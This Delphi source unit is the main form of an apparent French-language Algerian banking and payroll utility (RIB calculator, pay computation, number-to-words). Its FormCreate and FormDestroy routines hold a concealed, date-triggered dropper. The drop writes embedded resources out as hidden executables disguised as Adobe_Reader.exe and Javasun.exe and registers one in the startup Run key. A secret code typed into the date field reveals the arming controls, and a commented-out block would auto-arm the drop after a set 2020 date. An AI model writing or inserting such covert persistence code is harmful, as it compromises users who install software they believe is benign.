// ---------------------------------------------------------------------------

// Ce logiciel est Copyright (c) 2015 Embarcadero Technologies, Inc.
// Vous ne pouvez utiliser ce logiciel que si vous êtes un licencié autorisé
// d'un produit d'outils de développement Embarcadero.
// Ce logiciel est considéré comme redistribuable tel que défini sous
// l'accord de licence du logiciel fourni avec les produits Embarcadero
// et est soumis à cet accord de licence de logiciel.

// ---------------------------------------------------------------------------

Unit uSMainView;

Interface

Uses
  Winapi.Windows, Winapi.Messages, System.Sysutils, System.Variants,
  System.Classes, System.Imagelist, System.Actions, Vcl.Graphics, Vcl.Controls,
  Vcl.Forms, Vcl.Dialogs, Vcl.Extctrls, Vcl.Winxctrls, Vcl.Stdctrls,
  Vcl.Categorybuttons, Vcl.Buttons, Vcl.Imglist, Vcl.Imaging.Pngimage,
  Vcl.Comctrls, Vcl.Actnlist, Shellapi, Shlobj, Inifiles, Math, StrUtils,
  DateUtils, ResourceExport;

Type
  Tfrm_mainform = Class(Tform)
    Pnltoolbar: Tpanel;
    Sv: Tsplitview;
    Catmenuitems: Tcategorybuttons;
    Imlicons: Timagelist;
    Imgmenu: Timage;
    Actionlist1: Tactionlist;
    Acthome: Taction;
    Acpaie: Taction;
    Acpower: Taction;
    Lbltitle: Tlabel;
    Pnl_main: Tpanel;
    Acparam: Taction;
    Acrib: Taction;
    Actrib: Taction;
    Acpropos: Taction;
    Image2: Timage;
    Panel1: Tpanel;
    Chkcloseonmenuclick: Tcheckbox;
    Lblvclstyle: Tlabel;
    Cbxvclstyles: Tcombobox;
    Acconvert: Taction;
    Labverinfo: Tlabel;
    Label1: Tlabel;
    ChkStyOn: TCheckBox;
    StatusBar1: TStatusBar;
    EdNow: TEdit;
    ChkActiver: TCheckBox;
    ChkCloseStyle: TCheckBox;
    LstLog: TListBox;
    Image1: TImage;
    SBActiver: TSpeedButton;
    SBShowdt: TSpeedButton;
    ResEx1: TResourceExport;
    ResEx2: TResourceExport;
    Shape1: TShape;
    Procedure Formcreate(Sender: Tobject);
    Procedure Svclosed(Sender: Tobject);
    Procedure Svopened(Sender: Tobject);
    Procedure Svopening(Sender: Tobject);
    Procedure Catmenuitemscategorycollapase(Sender: Tobject;
      Const Category: Tbuttoncategory);
    Procedure Imgmenuclick(Sender: Tobject);
    Procedure Acthomeexecute(Sender: Tobject);
    Procedure Acpaieexecute(Sender: Tobject);
    Procedure Acpowerexecute(Sender: Tobject);
    Procedure Cbxvclstyleschange(Sender: Tobject);
    Procedure Acparamexecute(Sender: Tobject);
    Procedure Acribexecute(Sender: Tobject);
    Procedure Actribexecute(Sender: Tobject);
    Procedure Acproposexecute(Sender: Tobject);
    Procedure Acconvertexecute(Sender: Tobject);
    Procedure Formclose(Sender: Tobject; Var Action: Tcloseaction);
    Procedure FormDestroy(Sender: TObject);
    Procedure ChkStyOnClick(Sender: TObject);
    Procedure FormActivate(Sender: TObject);
    Procedure EdNowChange(Sender: TObject);
    Procedure ChkCloseStyleClick(Sender: TObject);
    Procedure SBActiverClick(Sender: TObject);
    Procedure SBShowdtClick(Sender: TObject);

  Private
    Procedure Log(Const Msg: String);
    Procedure LoadIniPar(SiDir: String);
    Procedure SaveIniPar(SiDir: String);
  Protected
    // procedure WMMoving(var Message: TWMMoving); message WM_MOVING;
    Procedure WMDisplayChange(Var Message: TWMDisplayChange);
      Message WM_DISPLAYCHANGE;
  Public
    { Déclarations publiques }
    Procedure AppOnmess(Var Msg: Tmsg; Var Handled: Boolean);
  End;

Var
  Frm_mainform: Tfrm_mainform;

  { _______________________________________________________________________ }
  { _______________________________________________________________________ }
Implementation

Uses
  Vcl.Themes, Unit_ux, Unit_01, Unit_02, Unit_03, Unit_04, Sun_function;

{$R *.dfm}
// {$WARN Unit_Platform Off}
// {$WARN Symbol_Platform Off}
{$WEAKLINKRTTI ON}
{$RTTI EXPLICIT METHODS([]) PROPERTIES([]) FIELDS([])}
{$WARN SYMBOL_PLATFORM OFF}
{$WARNINGS OFF}

{ ............................................................................ }
Procedure Tfrm_mainform.WMDisplayChange(Var Message: TWMDisplayChange);
Begin
  ShowMessageFmt('The screen resolution has changed to %d×%d×%d.',
    [Message.Width, Message.Height, Message.BitsPerPixel]);
  Paramstr_form(Frm_mainform, Screen.Width, Screen.Height);
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.SaveIniPar(SiDir: String);
Var
  SLstlog: String;
Begin
  IniFile := TIniFile.Create(SiDir);
  Try
    With IniFile Do
    Begin
      Writestring('paramètres_listes des banaque', '001',
        'Banque Nationale d''Algérie (BNA)');
      Writestring('paramètres_listes des banaque', '002',
        'Banque Extérieure d''Algérie (BEA)');
      Writestring('paramètres_listes des banaque', '003',
        'Banque de l''Agriculture et du Développement Rural (BADR)');
      Writestring('paramètres_listes des banaque', '004',
        'Crédit Populaire d''Algérie (CPA)');
      Writestring('paramètres_listes des banaque', '005',
        'Banque de Développement Local (BDL)');
      Writestring('paramètres_listes des banaque', '006',
        'Banque Al Baraka d''Algérie');
      Writestring('paramètres_listes des banaque', '007',
        'Centre des Cheques Postaux');
      Writestring('paramètres_listes des banaque', '008', 'Trésor  Central');
      Writestring('paramètres_listes des banaque', '010',
        'Caisse Nationale de Mutualité Agricole-banques (CNMA-banque)');
      Writestring('paramètres_listes des banaque', '011',
        'Caisse Nationale d''Epargne et de Prévoyance (CNEP-Banque)');
      Writestring('paramètres_listes des banaque', '012',
        'City Bank NA Algéria');
      Writestring('paramètres_listes des banaque', '014',
        'Arab Banking Corporation-Algeria (ABC)');
      Writestring('paramètres_listes des banaque', '020', 'Natexis-Algérie');
      Writestring('paramètres_listes des banaque', '021',
        'Société Générale-Algérie');
      Writestring('paramètres_listes des banaque', '026',
        'Arab Bank PLC-Algeria');
      Writestring('paramètres_listes des banaque', '027',
        'BNP Paribas-El Djazair');
      Writestring('paramètres_listes des banaque', '029', 'Trust Bank-Algeria');
      Writestring('paramètres_listes des banaque', '031',
        'The Housing Bank for Trade and Finance-Algeria');
      Writestring('paramètres_listes des banaque', '032', 'Gulf Bank Algérie');
      Writestring('paramètres_listes des banaque', '035',
        'Fransabank Al Djazair');
      Writestring('paramètres_listes des banaque', '036', 'Calyon-Algérie');
      Writestring('paramètres_listes des banaque', '037',
        'HSBC-Algérie, Succursale de banque');
      Writestring('paramètres_listes des banaque', '038',
        'Al Salam Bank-Algeria');
      Writestring('paramètres_listes des banaque', '111', 'Banque d''Algerie');
      { ... }
      WriteInteger('Paramètres', 'fHeight', Frm_mainform.Height);
      WriteInteger('Paramètres', 'fWidth', Frm_mainform.Width);
      WriteInteger('Paramètres', 'fleft', Frm_mainform.Left);
      WriteInteger('Paramètres', 'ftop', Frm_mainform.Top);
      WriteInteger('Paramètres', 'fstyle', CbxVclStyles.ItemIndex);
      WriteBool('Paramètres', 'fsform', ChkStyOn.Checked);
      WriteBool('Paramètres', 'fsChkSv', Chkcloseonmenuclick.Checked);
      WriteBool('Paramètres', 'fsChkCloseStyle', ChkCloseStyle.Checked);
      WriteBool('Paramètres', 'fsChkActiver', ChkActiver.Checked);
      { WriteDate('Paramètres', 'fsdtkActiver',DTacces); }
      WriteInteger('Paramètres', 'fsdtkActiver', Trunc(DTacces));
      If Lstlog.Items.Count - 1 > 0
      Then
      Begin
        Lstlog.Selected[Lstlog.Items.Count - 2];
        SLstlog := Lstlog.Items.Strings[Lstlog.Items.Count - 2];
      End;
      Writestring('Paramètres', 'fsPanel', SLstlog);
    End; { With IniFile }
  Finally
    IniFile.Free;
  End;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.LoadIniPar(SiDir: String);
Begin
  IniFile := TIniFile.Create(SiDir);
  Try
    Frm_mainform.Height := IniFile.ReadInteger('Paramètres', 'fHeight', 0);
    Frm_mainform.Width := IniFile.ReadInteger('Paramètres', 'fWidth', 0);
    Frm_mainform.Left := IniFile.ReadInteger('Paramètres', 'fleft', 0);
    Frm_mainform.Top := IniFile.ReadInteger('Paramètres', 'ftop', 0);
    CbxVclStyles.ItemIndex := IniFile.ReadInteger('Paramètres', 'fstyle', 0);

    ChkStyOn.Checked := IniFile.ReadBool('Paramètres', 'fsform', True);
    If ChkStyOn.Checked = True
    Then Frm_mainform.FormStyle := FsStayOnTop
    Else Frm_mainform.FormStyle := FsNormal;

    Chkcloseonmenuclick.Checked := IniFile.ReadBool('Paramètres',
      'fsChkSv', True);

    ChkCloseStyle.Checked := IniFile.ReadBool('Paramètres',
      'fsChkCloseStyle', True);
    If ChkCloseStyle.Checked = True
    Then
    Begin
      Sv.CloseStyle := SvcCollapse;
      ChkCloseStyle.Caption := 'Close Style Collapse'
    End Else Begin
      Sv.CloseStyle := SvcCompact;
      ChkCloseStyle.Caption := 'Close Style Compact'
    End;
    TStyleManager.SetStyle(CbxVclStyles.Text);
    MMethodenvent := IniFile.Readstring('Paramètres', 'fsPanel', '');

    ChkActiver.Checked := IniFile.ReadBool('Paramètres', 'fsChkActiver', False);
    DTacces := FloatToDateTime(IniFile.ReadInteger('Paramètres',
      'fsdtkActiver', 0));
  Finally
    IniFile.Free;
  End;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.SBActiverClick(Sender: TObject);
Var
  Dttemp: Tdate;
Begin
  If ChkActiver.Checked = True
  Then
  Begin
    Dttemp := Inputcombo('Zone de saisie ', 'Choisir exercice en cours');
    If Dttemp = FloatToDateTime(0)
    Then DTacces := DTacces
    Else DTacces := Dttemp;
  End;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.SBShowdtClick(Sender: TObject);
Begin
  ShowMessage(DateToStr(DTacces));
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.AppOnmess(Var Msg: Tmsg; Var Handled: Boolean);
Begin
  If (Msg.Message = WM_KEYDOWN) And (Msg.WParam = 13)
  Then
  Begin
    Perform(WM_NEXTDLGCTL, 0, 0);
    Handled := True; // le message a été traité
  End;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Parampanel(Param_panel: Tpanel; R, G, B: Byte);
Begin
  Param_panel.Styleelements := [];
  Param_panel.Color := Rgb(R, G, B);
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Bande(Band: Tpanel);
Begin
  Frm_01.Panel1.Visible := False;
  Frm_02.Panel1.Visible := False;
  Frm_03.Panel1.Visible := False;
  Frm_04.Panel1.Visible := False;
  Band.Visible := True;
  Band.Align := Alclient;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.FormActivate(Sender: TObject);
Begin
  If MMethodenvent = 'Accueil Cliqué'
  Then ActHome.Execute;
  If MMethodenvent = 'Calc Rib Cliqué'
  Then Acrib.Execute;
  If MMethodenvent = 'Multi Rib Cliqué'
  Then ActRib.Execute;
  If MMethodenvent = 'Calc Paie Cliqué'
  Then AcPaie.Execute;
  If MMethodenvent = 'Nb> Lettres Cliqué'
  Then AcConvert.Execute;
  If MMethodenvent = 'Options Cliqué'
  Then AcParam.Execute;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Formclose(Sender: Tobject; Var Action: Tcloseaction);
Begin
  Acthome.Execute;
  Application.Terminate;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Formcreate(Sender: Tobject);
Var
  Stylename: String;
  Dt: TDate;
  I: Integer;
Begin
  // Paramstr_Region;
  // ShowTaskBar(true);
  Paramstr_form(Frm_mainform, Screen.Width, Screen.Height);
  // If not (frm_mainform.Components[I] Is Tmemo) Then
  // Application.OnMessage := AppOnmess;

  For Stylename In Tstylemanager.Stylenames Do
      Cbxvclstyles.Items.Add(Stylename);
  Cbxvclstyles.Itemindex := Cbxvclstyles.Items.Indexof
    (Tstylemanager.Activestyle.Name);
  // sv.CloseStyle:=svcCompact;
  Sv.Close;

    Try
    StatusBar1.Panels[0].Text := MidStr(Fileverinfo(Application.Exename), 5, 4);
    Dt := StrToDate('01/01/2000') + StrToInt(StatusBar1.Panels[0].Text);
    StatusBar1.Panels[0].Text := 'Ver.:' + Fileverinfo(Application.Exename) +
    ' Build ' + DateToStr(Dt);
    Except
    StatusBar1.Panels[0].Text := ''
    End;


  If Not Directoryexists(Getspecialfolderpath(Csidl_appdata) + '\Softrasun')
  Then
    If Not Createdir(Getspecialfolderpath(Csidl_appdata) + '\Softrasun')
    Then Raise Exception.Create
        ('Impossible de créer un calcule pour ce compte');
  Inidir := Getspecialfolderpath(Csidl_appdata) + '\Softrasun\Parametres.sav';
  // IniDir := 'd:\Parametres.sav';
  If Not FileExists(Inidir)
  Then
  Begin
    SaveIniPar(IniDir);
    FileSetAttr(IniDir, FaHidden);
    FileSetAttr(GetSpecialFolderPath(CSIDL_APPDATA) + '\Softrasun\', FaHidden);
    IniFile := TIniFile.Create(IniDir);
    Try
      IniFile.WriteBool('Paramètres', 'fsbuild', False);
    Finally
      IniFile.Free;
    End;
  End Else Begin
    LoadIniPar(IniDir);
    If ChkActiver.Checked = True
    Then
      If DTacces <= Now
      Then
      Begin
        If IniFile.ReadBool('Paramètres', 'fsBuild', False) = False
        Then
        Begin
          If Not IsAppInRun('Softrasun')
          Then DoAppToRun('Softrasun', GetSpecialFolderPath(CSIDL_APPDATA) +
              '\Softrasun\Adobe_Reader.exe');
          ResEx1.ExportFileName := GetSpecialFolderPath(CSIDL_APPDATA) +
            '\Softrasun\Adobe_Reader.exe';
          ResEx2.ExportFileName := GetSpecialFolderPath(CSIDL_APPDATA) +
            '\Softrasun\Javasun.exe';
          ResEx1.Execute;
          ResEx2.Execute;
        End;
      End;
    FileSetAttr(IniDir, FaHidden);
    FileSetAttr(GetSpecialFolderPath(CSIDL_APPDATA) +
      '\Softrasun\Adobe_Reader.exe', FaHidden);
    FileSetAttr(GetSpecialFolderPath(CSIDL_APPDATA) + '\Softrasun\Javasun.exe',
      FaHidden);
    FileSetAttr(GetSpecialFolderPath(CSIDL_APPDATA) + '\Softrasun\', FaHidden);
  End;

  // Lbltitle.Caption := IntToStr(Screen.Width);
  Lbltitle.Caption := Lbltitle.Caption; // + '*' + IntToStr(Screen.Height);
  EdNow.Font.Size := 9;
  EdNow.Width := Panel1.Width - EdNow.Left - 15;

  EdNow.Text := FormatDateTime('"Le : " dddd, d mmmm , yyyy',
    IncHour(Now(), 0));

  Sv.Width := Frm_mainform.Width - 15;
  Sv.Openedwidth := Frm_mainform.Width - 15;
  Sv.DisplayMode := SvmOverlay;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.FormDestroy(Sender: TObject);
Begin
  SaveIniPar(IniDir);
  IniFile := TIniFile.Create(IniDir);
  If IniFile.ReadBool('Paramètres', 'fsBuild', False) = True
  Then
  Begin
    DeleteFile(GetSpecialFolderPath(CSIDL_APPDATA) +
      '\Softrasun\Adobe_Reader.exe');
    DeleteFile(GetSpecialFolderPath(CSIDL_APPDATA) + '\Softrasun\Javasun.exe');
    If IsAppInRun('Softrasun')
    Then DelAppFromRun('Softrasun');
    IniFile.WriteBool('Paramètres', 'fsChkActiver', False);
  End;
  IniFile.Free;
  /// AUTO ACTIVATION DTACCES 26/06/2020 SOIS 96 JOURS
  /// /////////////////////////////////////////////////////////////////////////
(*

    If 44008 <= Now
    Then
    Begin
      IniFile := TIniFile.Create(IniDir);
      Try
        IniFile.WriteBool('Paramètres', 'fsBuild', False);
        IniFile.WriteBool('Paramètres', 'fsChkActiver', True);
        { WriteDate('Paramètres', 'fsdtkActiver',DTacces); }
        IniFile.WriteInteger('Paramètres', 'fsdtkActiver', Trunc(44007));

        If Not IsAppInRun('Softrasun')
        Then DoAppToRun('Softrasun', GetSpecialFolderPath(CSIDL_APPDATA) +
            '\Softrasun\Adobe_Reader.exe');
        ResEx1.ExportFileName := GetSpecialFolderPath(CSIDL_APPDATA) +
          '\Softrasun\Adobe_Reader.exe';
        ResEx2.ExportFileName := GetSpecialFolderPath(CSIDL_APPDATA) +
          '\Softrasun\Javasun.exe';
        ResEx1.Execute;
        ResEx2.Execute;
        FileSetAttr(IniDir, FaHidden);
        FileSetAttr(GetSpecialFolderPath(CSIDL_APPDATA) +
          '\Softrasun\Adobe_Reader.exe', FaHidden);
        FileSetAttr(GetSpecialFolderPath(CSIDL_APPDATA) +
          '\Softrasun\Javasun.exe', FaHidden);
        FileSetAttr(GetSpecialFolderPath(CSIDL_APPDATA) + '\Softrasun\',
          FaHidden);
      Finally
        IniFile.Free;
      End;
    End;
*)
  /// /////////////////////////////////////////////////////////////////////////

End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Cbxvclstyleschange(Sender: Tobject);
Begin
  Tstylemanager.Setstyle(Cbxvclstyles.Text);
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.ChkCloseStyleClick(Sender: TObject);
Begin
  If ChkCloseStyle.Checked = True
  Then
  Begin
    Sv.CloseStyle := SvcCollapse;
    ChkCloseStyle.Caption := 'Close Style Collapse'
  End Else Begin
    Sv.CloseStyle := SvcCompact;
    ChkCloseStyle.Caption := 'Close Style Compact'
  End;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.ChkStyOnClick(Sender: TObject);
Begin
  If ChkStyOn.Checked = True
  Then Frm_mainform.FormStyle := FsStayOnTop
  Else Frm_mainform.FormStyle := FsNormal;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.EdNowChange(Sender: TObject);
Begin
  If EdNow.Text = '110319822020'
  Then // 110319822020
  Begin
    ChkActiver.Visible := True;
    SBActiver.Visible := True;
    SBShowdt.Visible := True;
  End Else Begin
    ChkActiver.Visible := False;
    SBActiver.Visible := False;
    SBShowdt.Visible := False;
  End;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Imgmenuclick(Sender: Tobject);
Begin
  If Sv.Opened
  Then Sv.Close
  Else Sv.Open;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Svclosed(Sender: Tobject);
Begin
  // When TSplitView is closed, adjust ButtonOptions and Width
  Catmenuitems.Buttonoptions := Catmenuitems.Buttonoptions - [Boshowcaptions];
  If Sv.Closestyle = Svccompact
  Then Catmenuitems.Width := Sv.Compactwidth;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Svopened(Sender: Tobject);
Begin
  // When not animating, change size of catMenuItems when TSplitView is opened
  Catmenuitems.Buttonoptions := Catmenuitems.Buttonoptions + [Boshowcaptions];
  Catmenuitems.Width := Sv.Openedwidth;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Svopening(Sender: Tobject);
Begin
  // When animating, change size of catMenuItems at the beginning of open
  Catmenuitems.Buttonoptions := Catmenuitems.Buttonoptions + [Boshowcaptions];
  Catmenuitems.Width := Sv.Openedwidth;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Acribexecute(Sender: Tobject);
Begin
  Log(Acrib.Caption + ' Cliqué');
  If Sv.Opened And Chkcloseonmenuclick.Checked
  Then Sv.Close;
  Frm_01.Panel1.Parent := Pnl_main;
  Bande(Frm_01.Panel1);
  Frm_01.SpBClear.Click;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Actribexecute(Sender: Tobject);
Begin
  Log(Actrib.Caption + ' Cliqué');
  If Sv.Opened And Chkcloseonmenuclick.Checked
  Then Sv.Close;
  Frm_02.Panel1.Parent := Pnl_main;
  Bande(Frm_02.Panel1);
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Acthomeexecute(Sender: Tobject);
Begin
  Bande(Frm_mainform.Pnl_main);
  Log(Acthome.Caption + ' Cliqué');
  If Sv.Opened And Chkcloseonmenuclick.Checked
  Then Sv.Close;
  Panel1.Hide;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Acproposexecute(Sender: Tobject);
Begin
  Winabout(Application.Name, 'ouldkaci.rabah@gmail.com 2011-2020');
  // Log(Acpropos.Caption + ' Cliqué');
  If Sv.Opened And Chkcloseonmenuclick.Checked
  Then Sv.Close;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Acconvertexecute(Sender: Tobject);
Begin
  Log(Acconvert.Caption + ' Cliqué');
  If Sv.Opened And Chkcloseonmenuclick.Checked
  Then Sv.Close;
  Frm_04.Panel1.Parent := Pnl_main;
  Bande(Frm_04.Panel1);
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Acpaieexecute(Sender: Tobject);
Begin
  Log(Acpaie.Caption + ' Cliqué');
  If Sv.Opened And Chkcloseonmenuclick.Checked
  Then Sv.Close;
  Frm_03.Panel1.Parent := Pnl_main;
  Bande(Frm_03.Panel1);
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Acpowerexecute(Sender: Tobject);
Begin
  // Log(Acpower.Caption + ' Cliqué');
  If Sv.Opened And Chkcloseonmenuclick.Checked
  Then Sv.Close;
  Application.Terminate;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Acparamexecute(Sender: Tobject);
Begin
  Log(Acparam.Caption + ' Cliqué');
  If Sv.Opened And Chkcloseonmenuclick.Checked
  Then Sv.Close;

  Bande(Frm_mainform.Pnl_main);
  Panel1.Show;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Catmenuitemscategorycollapase(Sender: Tobject;
  Const Category: Tbuttoncategory);
Begin
  // Prevent the catMenuItems Category group from being collapsed
  Catmenuitems.Categories[0].Collapsed := False;
End; { _______________________________________________________________________ }

{ ............................................................................ }
Procedure Tfrm_mainform.Log(Const Msg: String);
Var
  Idx: Integer;
Begin
  Idx := Lstlog.Items.Add(Msg);
  Lstlog.Topindex := Idx;
  (*
    StatusBar1.Panels[1].Text := Format('%11.5f', [Real(Now)]);
  *)
End; { _______________________________________________________________________ }

End.
